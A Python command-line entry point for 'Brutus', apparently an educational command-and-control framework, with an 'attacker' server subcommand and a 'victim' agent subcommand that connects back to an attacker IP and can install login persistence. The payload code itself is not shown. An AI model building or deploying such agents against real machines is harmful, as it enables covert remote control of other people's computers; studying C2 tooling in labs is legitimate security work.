"""Top-level CLI: `brutus attacker` / `brutus victim [opts]`."""

import argparse


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        prog="brutus",
        description="Brutus — educational C2 framework",
    )
    parser.add_argument("--version", action="store_true", help="Print version and exit")

    sub = parser.add_subparsers(dest="role")

    # ── attacker ──────────────────────────────────────────────────────────────
    att = sub.add_parser("attacker", help="Start the attacker server")
    att.add_argument("--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
    att.add_argument("--port", type=int, default=8080, help="Control port (default: 8080)")

    # ── victim ────────────────────────────────────────────────────────────────
    vic = sub.add_parser("victim", help="Start the victim agent")
    vic.add_argument("--host", required=True, help="Attacker IP to connect to")
    vic.add_argument("--port", type=int, default=8080, help="Attacker port (default: 8080)")
    vic.add_argument(
        "--install-persistence",
        action="store_true",
        help="Register this agent to run at login",
    )

    args = parser.parse_args(argv)

    if args.version:
        from brutus.attacker.util import VERSION

        print(VERSION)
        return 0

    if args.role == "attacker":
        from brutus.attacker import main as attacker_main

        attacker_main.main()
        return 0

    if args.role == "victim":
        from brutus.victim.payload import main as victim_main

        victim_main(
            ["--host", args.host, "--port", str(args.port)]
            + (["--install-persistence"] if args.install_persistence else [])
        )
        return 0

    parser.print_help()
    return 0
